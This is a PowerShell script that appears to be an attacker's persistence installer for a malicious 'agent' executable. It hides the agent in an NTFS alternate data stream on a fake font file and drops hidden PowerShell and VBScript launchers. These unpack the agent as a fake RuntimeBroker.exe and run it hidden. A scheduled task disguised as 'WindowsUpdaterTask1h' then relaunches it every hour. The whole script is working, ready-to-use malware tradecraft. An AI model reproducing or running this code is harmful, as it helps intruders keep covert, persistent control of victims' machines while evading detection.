$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

$agentPath = $env:AgentPath
if (-not $agentPath) { Write-Output "AgentPath not set."; exit }

# ---- ADS & launchers ----
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) { New-Item -ItemType Directory -Path $fontDir -Force | Out-Null; attrib +h $fontDir }
$fontFile = "$fontDir\seguibl.ttf"
if (-not (Test-Path $fontFile)) { Set-Content -Path $fontFile -Value "TTF fake font file - do not delete" -Encoding ASCII -Force; attrib +h $fontFile }

$streamName = "Zone.Identifier"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte

$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\RuntimeBroker.exe"
if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
if (`$bytes) {
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    `$env:AgentPath = `$tempAgent
    Start-Process -WindowStyle Hidden -FilePath `$tempAgent
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath

$vbsPath = "$fontDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath

# ---- Scheduled task: every 1 hour ----
$taskName = "WindowsUpdaterTask1h"
schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it 2>$null
if ($LASTEXITCODE -eq 0) {
    Write-Output "✅ Persistence installed (every 1 hour). Agent runs as %TEMP%\RuntimeBroker.exe"
    schtasks /run /tn $taskName 2>$null
} else {
    Write-Output "❌ Task creation failed."
}
